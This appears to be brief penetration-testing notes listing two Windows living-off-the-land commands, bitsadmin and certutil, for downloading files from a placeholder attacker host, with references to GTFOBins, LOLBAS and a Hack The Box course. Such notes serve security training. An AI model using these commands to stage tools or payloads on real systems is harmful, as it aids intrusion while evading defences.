Downloading File with Bitsadmin:
```
bitsadmin /transfer wcb /priority foreground http(s)://<ip>/<fname> <abspath_to_save_file>
```
Downloading File with Certutil:
```
certutil.exe -verifyctl -split -f http(s)://<ip>/<fname>
```

Reference: 
https://gtfobins.github.io/
https://lolbas-project.github.io/#
https://academy.hackthebox.com/app/module/24/section/1575